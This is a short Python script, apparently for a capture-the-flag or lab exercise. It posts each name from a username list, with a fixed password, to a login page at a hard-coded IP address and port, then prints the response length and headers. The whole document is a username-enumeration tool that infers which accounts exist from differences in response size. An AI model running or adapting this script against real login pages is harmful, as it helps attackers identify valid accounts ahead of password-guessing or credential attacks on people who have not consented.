import requests
import json 

with open("usernames.txt", "r") as f:
	usernames = f.readlines()

url = "http://139.59.176.158:32499/index.php"
s = requests.Session()

for username in usernames:
	username = username.strip()

	data = {
		"username": username,
		"password": "test"
	}
	r = s.post(url, data=data)

	print(f"{username} -> {r.headers['Content-Length']}")
	print(r.headers)
	